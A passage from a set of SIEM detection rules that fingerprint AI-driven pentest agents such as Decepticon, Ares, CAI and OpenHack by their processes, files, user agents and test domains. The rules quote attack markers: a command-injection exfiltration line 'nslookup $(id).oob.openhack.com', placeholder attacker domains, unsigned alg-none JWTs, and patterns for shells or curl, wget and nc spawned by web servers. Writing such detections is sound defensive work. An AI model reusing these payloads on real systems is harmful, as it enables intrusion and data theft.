url.domain:/.*\.[zZ][eE][nN][mM][uU][xX]\.[aA][iI]/))

author: ThreatDefence
description:
Detects the rewrite CTF Agent's Claude solver applies to every Bash command its model writes: a PreToolUse hook
replaces the command with docker exec -i <full 64-character container id> bash -c <command>, so the Claude Code CLI
starts the Docker CLI with the full container id and no -t (backend/agents/claude_solver.py:189-201). People and
scripts usually pass a short id or a name. Many such processes in a few minutes, from a shell under the claude CLI,
is the solver loop.
false_positives: Scripts and tools that run docker exec -i with a full container id and bash -c
name: CTF Agent Claude Solver Command Redirected Into Its Sandbox
query: (process.command_line:*docker\ exec\ \-i\ * AND process.command_line:*\ bash\ \-c\ *) AND process.command_line:/.*docker exec -i [0-9a-f]{64} bash -c .*/

author: ThreatDefence
description:
Detects RedAI (kpolley/redai) on the host that runs it: the redai launcher run by Bun, its install, the Chrome
profile it creates under ~/.redai/ for its browser validator, the iOS simulators it creates and clones with names
starting redai-, and commands its agents run on files in its run folder ~/.redai/runs/<runId>/.
false_positives: Authorized application security tests with RedAI
Another program that keeps a folder named .redai in the home directory
name: RedAI AI Vulnerability Validation Workbench Running or Installed
query: ((process.executable:(*\/bun OR *\\bun.exe)) AND (process.command_line:(*\/bin\/redai OR *bun\ run\ redai))) OR (process.command_line:(*@kpolley\/redai* OR *github.com\/kpolley\/redai*)) OR (process.command_line:(*\/.redai\/validator\-environments\/* OR *\/.redai\/runs\/* OR *\\.redai\\validator\-environments\\* OR *\\.redai\\runs\\*)) OR process.command_line:*simctl\ create\ redai\-template\-* OR (process.command_line:*simctl\ clone\ * AND process.command_line:*\ redai\-*)

author: ThreatDefence
description:
Detects the command CyberStrikeAI's webshell manager runs on every new webshell, "echo :OSPROBE_%OS%:END", which
shows up as a shell started by the web server process.
false_positives: Authorized tests with CyberStrikeAI
name: CyberStrikeAI Webshell OS Probe Command
query: process.command_line:*\:OSPROBE_*

author: ThreatDefence
description:
Detects the files Vigilo (certeu/vigilo at 82c2d353) writes in a repository it assesses: the run folder
.vigilo/<session>/ with its agents/, prompts/ and deliverables/ folders, the .vigilo-remote-url file, and the Git
delivery state .git/vigilo-delivery.json and .git/vigilo-rebuild.json used when it pushes fix branches.
false_positives: Security teams running Vigilo
name: Vigilo Run Folder, Deliverables or Delivery State Written
query: (TargetFilename:*\/.vigilo\/* AND (TargetFilename:(*\/deliverables\/* OR *\/agents\/* OR *\/prompts\/*))) OR (TargetFilename:(*\/.vigilo\-remote\-url OR *\/.git\/vigilo\-delivery.json OR *\/.git\/vigilo\-rebuild.json OR *\/.git\/vigilo\-delivery.lock))

author: ThreatDefence
description:
Detects the user agents Clearwing (Lazarus-AI-OSS/clearwing) sets in its own code: Clearwing/1.0 in its headless
browser and JavaScript bundle analyzer, clearwing-asm/0.5 for attack-surface probes and threat-intel downloads,
"clearwing (aiohttp openai fallback)" for model gateways and "codex_cli_rs/0.0.0 (clearwing)" for a reused ChatGPT
subscription. The last two need TLS inspection when the model endpoint uses HTTPS.
false_positives: Security teams and researchers running Clearwing
name: Clearwing User Agents in Proxy Logs
query: (user_agent.original:(*Clearwing\/1.0* OR *codex_cli_rs\/0.0.0\ \(clearwing\)*)) OR (user_agent.original:(clearwing\-asm\/* OR clearwing\ \(aiohttp\ openai\ fallback\)*))

author: ThreatDefence
description:
Detects a JSON Web Token whose header decodes to alg none, sent in a query string. ARTEX sprays the
same unsigned token across dozens of SSO paths to test for signature bypass. An alg none token has
no legitimate use against a production SSO route.
false_positives: Security scanners testing for JWT signature bypass
name: Unsigned JWT With alg none Sent to a Web Application
query: url.query:(*eyJhbGciOiJub25lI* OR *eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lI* OR *eyJhbGciOiJOb25lI* OR *eyJhbGciOiJOT05FI* OR *eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.* OR *eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.*)

author: ThreatDefence
description:
Detects a request to one of the made-up domains in the Custom AI Agent Burp extension's payload table
(evil-burp-ai.com, evil-burp-ai-test.com, evil-burp-ai-cache.com and names under them), which happens when one of
your servers follows its open redirect, OAuth redirect, host header or cache poisoning payload, and requests that
carry its XSS and header injection markers (XSS-BURP-AI, burp-ai-test) through a proxy.
false_positives: Authorized tests with the Custom AI Agent extension's active scanner
name: Custom AI Agent (burp-ai-agent) Test Domains or Payload Markers in Proxy Logs
query: url.domain:/.*[eE][vV][iI][lL]-[bB][uU][rR][pP]-[aA][iI].*/ OR (url.original:(*XSS\-BURP\-AI* OR *burp\-ai\-test* OR *evil\-burp\-ai*))

author: ThreatDefence
description:
Detects a web server, application runtime or database process starting a shell, download tool or
network utility. ARTEX agents run discovery and pull tooling this way after exploiting a web
application, in quick succession and in short bursts.
false_positives: Application servers that run shell scripts by design. Baseline each service before alerting
name: Web or Database Service Spawns a Shell or Download Tool on Linux
query: (((process.parent.executable:(*\/nginx OR *\/httpd OR *\/apache2 OR *\/php\-fpm OR *\/mysqld OR *\/mariadbd OR *\/postgres)) OR process.parent.executable:*\/php\-fpm*) OR ((process.parent.executable:(*\/java OR *\/node)) AND (user.name:(www\-data OR apache OR nginx OR http OR tomcat OR tomcat9 OR jetty OR jboss OR wildfly OR node OR nodejs OR nobody OR daemon)))) AND (process.executable:(*\/sh OR *\/bash OR *\/dash OR *\/curl OR *\/wget OR *\/nc OR *\/ncat OR *\/socat OR *\/busybox))

author: ThreatDefence
description:
Detects Decepticon traffic in the logs of a web server it tests or exposes: a user agent with the Decepticon/
token, a user agent template from its opsec skill sent with the placeholder unfilled (<CHROME_VER>, <FIREFOX_VER>,
<CURRENT_VER>), and requests to its LangGraph server routes under /_decepticon/. Most of Decepticon's target
traffic comes from ordinary tools and impersonated browsers, so absence of a match means little.
false_positives: Authorized tests with Decepticon
name: Decepticon Markers in Web Server Logs
query: (user_agent.original:(*Decepticon\/* OR *\<CHROME_VER\>* OR *\<FIREFOX_VER\>* OR *\<CURRENT_VER\>*)) OR url.path:\/_decepticon\/*

author: ThreatDefence
description:
Detects the CAI (Cybersecurity AI, aliasrobotics/cai) command line started as an API backend, Textual UI, with
parallel agents, an initial prompt, --yolo or --unrestricted; the cai-framework package being installed (also from
Alias's private index on packages.aliasrobotics.com:664); its continuous-ops loop runner; and the Kali container
its /virtualization command starts as kali-security with host networking and seccomp off.
false_positives: Authorized tests and research with CAI
Other tools that name a container kali-security with seccomp turned off
name: CAI Cybersecurity AI CLI, Install, Continuous Ops Worker or Kali Container
query: process.command_line:/(.*([\/\\ ]))?cai(\.exe)?["']?[ ](.*[ ])?(--api|--api-host|--api-port|--tui|--yaml|--prompt|--yolo|--unrestricted)(([ =]).*)?/ OR process.command_line:/.*((pip|pip3|pipx)[ ]+install|uv[ ]+(tool[ ]+install|tool[ ]+run|pip[ ]+install|add)|uvx)[ ](.*[ ])?["']?cai-framework.*/ OR process.command_line:*packages.aliasrobotics.com* OR process.command_line:*cai.continuous_ops.loop_runner* OR (process.command_line:*docker* AND process.command_line:*\-\-name\ kali\-security* AND process.command_line:*\-\-security\-opt\=seccomp\=unconfined*)

author: ThreatDefence
description:
Detects the Cain command line (cdxiaodong/cain-agent): cain-agent run --target <host or URL>, from a pip install
(the console script cain-agent, pyproject.toml:27) or from its Docker image, whose ENTRYPOINT is cain-agent
(docker run ... cain-agent:latest run --target ..., Dockerfile:44, docs/docker.md:34-49). The run writes
scope.yaml and drives the recon, test and report stages with a model that has a shell (Bash, Read, Grep, Glob;
src/cain_agent/cli.py:43,113,133-238 at 2e3f4f1c).
false_positives: Authorized tests and research with Cain
name: Cain AI Pentest Agent Run
query: process.command_line:*cain\-agent* AND process.command_line:*\ run\ * AND process.command_line:*\-\-target*

author: ThreatDefence
description:
Detects PentestAgent by GH05TCREW running: the pentestagent console script or python -m pentestagent with its
subcommands, the MCP server mode (which listens on 0.0.0.0:8080 without authentication by default), the child
agents it spawns over named pipes in /tmp/pa_mcp_<random>/, and its container images. Not the nbshenxm/pentest-agent
research code, which has its own folder.
false_positives: Bug bounty hunters, red teams and security teams running PentestAgent
name: PentestAgent (GH05TCREW) CLI, MCP Server, Child Agent or Image on a Host
query: (process.command_line:(*\ \-m\ pentestagent* OR *\/bin\/pentestagent*)) OR (process.command_line:(*pentestagent\ mcp_server* OR *pentestagent\ tui* OR *pentestagent\ run\ *)) OR (process.command_line:*\-\-mcp\-fifo\-in* AND process.command_line:*\/pa_mcp_*) OR (process.command_line:(*gh05tcrew\/pentestagent* OR *pentestagent\-sandbox*))

author: ThreatDefence
description:
Detects a host resolving oob.openhack.com or a name under it. The OpenHack v0.x pentest agent (PyPI openhack 0.2.4)
mints callback URLs https://oob.openhack.com/<label>-<12 hex> for blind SSRF, command injection and XXE payloads,
and its prompt suggests nslookup $(id).oob.openhack.com, so a server that resolves this name most likely ran a
payload the agent sent. The host running the agent also resolves it when it polls the collector.
false_positives: The workstation or server that runs the OpenHack v0.x agent, when it polls the collector
Authorized tests with OpenHack against your servers
name: OpenHack Out-of-Band Collector Resolved
query: dns.question.name:/[oO][oO][bB]\.[oO][pP][eE][nN][hH][aA][cC][kK]\.[cC][oO][mM]/ OR dns.question.name:/.*\.[oO][oO][bB]\.[oO][pP][eE][nN][hH][aA][cC][kK]\.[cC][oO][mM]/

author: ThreatDefence
description:
Detects ARIA-X (01NGVI-QINGYI/ARIA-X at 015e197) running on a host: the engine started as python -m aria_x (the
container entry point is python -m aria_x serve --host 0.0.0.0 --port 8787) or through its aria-x command with the
serve, run or demo subcommand; the one-shot Docker sandbox it starts for every model command,
docker run --rm -i --name aria-x-<12 hex> ... -v <run>/work:/work -w /work <image> bash -lc <command> (interactive
sessions use --name aria-x-sess-<8 hex>); and, with the default local sandbox, bash -lc <command> as a child of the
ARIA-X Python process.
false_positives: Authorized use of ARIA-X
name: ARIA-X Engine, Console or Sandbox Command
query: process.command_line:*\ \-m\ aria_x\ * OR (process.command_line:(*\/aria\-x\ serve* OR *\/aria\-x\ run\ * OR *\/aria\-x\ demo*)) OR (process.command_line:(aria\-x\ serve* OR aria\-x\ run\ * OR aria\-x\ demo*)) OR (process.command_line:*\ run\ \-\-rm\ \-i\ * AND process.command_line:*\-\-name\ aria\-x\-* AND process.command_line:*\:\/work\ \-w\ \/work* AND process.command_line:*bash\ \-lc*) OR ((process.parent.command_line:(*\ \-m\ aria_x\ * OR *\/aria\-x\ run\ * OR *\/aria\-x\ serve*)) AND (process.command_line:(bash\ \-lc\ * OR \/bin\/bash\ \-lc\ *)))

author: ThreatDefence
description:
Detects files Ares (dreadnode/ares) writes on the host that runs it: Kerberos tickets in /tmp/ares-tickets
(privesc/delegation.rs:166, privesc/trust.rs:133) and their <ticket>.krb5.conf, the relay working folder
/tmp/ares_relay_<random>/ with relay.log and coerce.log (coercion.rs:815-822), Shadow Credentials exports
<temp>/ares_shadowcred_* (acl.rs:270,409-418), the SQL hive folder <temp>/ares-hive-<uuid> (lateral/mssql.rs:558),
worker and orchestrator logs in /var/log/ares/ and transcripts in ~/.ares/sessions/ and reports in ~/.ares/reports/
(agent_loop/config.rs:319-345, orchestrator/blue/investigation.rs:555).
false_positives: Authorized Ares deployments
Other software that uses an ares folder under /var/log or the home directory
name: Ares Working Files on Its Attack Box
query: TargetFilename:(*\/tmp\/ares\-tickets\/* OR *\/tmp\/ares_relay_* OR *\/ares_shadowcred_* OR *\/ares\-hive\-* OR *\/var\/log\/ares\/* OR *\/.ares\/sessions\/* OR *\/.ares\/reports\/*)

subtechnique.name: Name Resolution Poisoning and SMB Relay

author: ThreatDefence
description:
Detects the vibe-pentest skill (ok-helloworld/vibe-pentest at 0b80fbf1, 1.0.32, also on gitee.com) being installed:
a skill folder named vibe-pentest under a coding agent's skills folder, its sub-agent definitions copied by
scripts/install_sub_agents.py into <project>/.<agent>/agents/ (vuln-analysis-agent.md is the distinctive one), and
its scripts and sub-agent sources inside a vibe-pentest clone. The README tells users to let the agent clone the
repository itself, so the install folder varies; the folder name vibe-pentest is what stays.
false_positives: Security staff who use vibe-pentest
name: vibe-pentest Skill or Sub-Agents Installed for a Coding Agent
query: (TargetFilename:(*\/skills\/vibe\-pentest\/* OR *\\skills\\vibe\-pentest\\* OR *\/vibe\-pentest\/references\/sub_agents\/* OR *\\vibe\-pentest\\references\\sub_agents\\*)) OR (TargetFilename:(*\/vibe\-pentest\/scripts\/http_test.py OR *\\vibe\-pentest\\scripts\\http_test.py OR *\/vibe\-pentest\/scripts\/auto_update_skill.py OR *\\vibe\-pentest\\scripts\\auto_update_skill.py)) OR ((TargetFilename:(*\/agents\/* OR *\\agents\\*)) AND (TargetFilename:(*\/vuln\-analysis\-agent.md OR *\\vuln\-analysis\-agent.md)))

author: ThreatDefence
description:
Detects files Shannon writes on the host that runs it: the run state in <workspace>/.shannon/ (session.json,
workflow.log, startup-error.json), the agents' deliverables and exploitation queues in .shannon/deliverables/,
the stealth browser config in .shannon/.playwright/, and the npx-mode credential file ~/.shannon/config.toml.
false_positives: Authorized tests with Shannon
Another tool that keeps its state in a folder named .shannon
name: Shannon Workspace, Deliverable or Browser Files Written
query: TargetFilename:/.*[\/\\]\.shannon[\/\\](session\.json|workflow\.log|startup-error\.json)/ OR TargetFilename:/.*[\/\\]\.shannon[\/\\]deliverables[\/\\][a-z_]+_(deliverable\.md|exploitation_queue\.json|exploitation_evidence\.md)/ OR TargetFilename:/.*[\/\\]\.shannon[\/\\]\.playwright[\/\\](cli\.config\.json|scripts[\/\\]stealth\.js)/ OR (TargetFilename:(*\/.shannon\/config.toml OR *\\.shannon\\config.toml))

author: ThreatDefence
description:
Detects processes that only Decepticon's containers start: the sandbox command daemon (python3 -m
decepticon_sandbox.server on port 9999), its web and browser runners (python3 -I -m decepticon_sandbox.web or
.browser), the prompt hook that reports each command's exit status to tmux (@dcptn_completion), the LangGraph agent
server and time-window resumer, and the Sliver operator config the c2-sliver container creates for the decepticon
operator. Needs process telemetry from inside containers (Linux EDR, auditd, Falco).
false_positives: Authorized tests and research with Decepticon
selection_havoc matches any Havoc teamserver started with that profile path, not only Decepticon's
name: Decepticon Sandbox, Agent Server or C2 Container Process
query: (process.command_line:(*decepticon_sandbox.server* OR *decepticon_sandbox.web* OR *decepticon_sandbox.browser* OR *@dcptn_completion*)) OR (process.command_line:(*decepticon.cli\ time\-window\-resume* OR *\/app\/litellm_startup.py*)) OR (process.command_line:*sliver\-server\ operator* AND process.command_line:*\-\-name\ decepticon*) OR (process.command_line:*teamserver\ server* AND process.command_line:*\/opt\/havoc\/profiles\/havoc.yaotl*)

author: ThreatDefence
description:
Detects the user agents Decepticon's own HTTP clients send from the host that runs it: decepticon-telemetry/1.0 to
its telemetry gateway, decepticon-roe/1 to crt.sh when an engagement is created, decepticon-http-sandbox/1 to its
sandbox daemon, Decepticon/1.0 on one model gateway entry, and the placeholder ChatGPT subscription user agent
codex_cli_rs/0.0.0. Also matches the telemetry gateway host. Needs TLS inspection for the HTTPS requests.
false_positives: Authorized tests with Decepticon
name: Decepticon Telemetry, Discovery, Sandbox or Model Gateway Requests in Proxy Logs
query: (user_agent.original:(decepticon\-telemetry\/1.0 OR decepticon\-roe\/1 OR decepticon\-http\-sandbox\/1 OR "codex_cli_rs\/0.0.0 \(Unknown 0; unknown\) unknown")) OR user_agent.original:*Decepticon\/* OR (url.domain:/[dD][eE][cC][eE][pP][tT][iI][cC][oO][nN]-[tT][eE][lL][eE][mM][eE][tT][rR][yY]-[gG][aA][tT][eE][wW][aA][yY]\.[pP][uU][rR][pP][lL][eE][aA][iI][lL][aA][bB]\.[wW][oO][rR][kK][eE][rR][sS]\.[dD][eE][vV]/ OR url.domain:/.*\.[dD][eE][cC][eE][pP][tT][iI][cC][oO][nN]-[tT][eE][lL][eE][mM][eE][tT][rR][yY]-[gG][aA][tT][eE][wW][aA][yY]\.[pP][uU][rR][pP][lL][eE][aA][iI][lL][aA][bB]\.[wW][oO][rR][kK][eE][rR][sS]\.[dD][eE][vV]/)

author: ThreatDefence
description:
Detects certipy runs started by Ares (dreadnode/ares). When the model gives no output name, Ares names the
certificate files cert_<template>_<token>, shadow_<account>_<token> or forged_<upn>_<token>.pfx, where the token is
<epoch milliseconds>-<pid>-<sequence> from unique_run_token (privesc/adcs.rs:51-54,229,340,450,490). Plain certipy
defaults to the account name, so the 13-digit millisecond stamp followed by a pid is the signal.
false_positives: Authorized Ares operations
name: Ares Certipy Output File Names
query: process.command_line:*certipy* AND process.command_line:/.*-out[ ]+[^ ]*(cert_|shadow_|forged_|cert_retrieve_)[^ ]+_[0-9]{13}-[0-9]+-[0-9]+.*/

author: ThreatDefence
description:
Detects Blitz Strike testing a web server: the user agents its own HTTP code sets (blitzstrike/1.0, blitzstrike/2,
Mozilla/5.0 (compatible; BlitzStrike/2.4), Mozilla/5.0 (blitzstrike oracle probe) and the other "blitzstrike ..."
probes, and Mozilla/5.0 (recon-agent) from its leaked key check), and the markers its live checks put in the query
string: the open redirect host evil-blitz.example.com, the SSRF canary URL http://httpbin.org/anything/blitzstrike-ssrf-canary,
the CRLF probe %0d%0aX-BlitzStrike%3A%20injected, the file read control path /bs-nonexistent-<id>, the browser XSS flag
window.__blitz_xss__ and the proof of concept marker zzblitz. The run_engagement call sends the user agent, the open
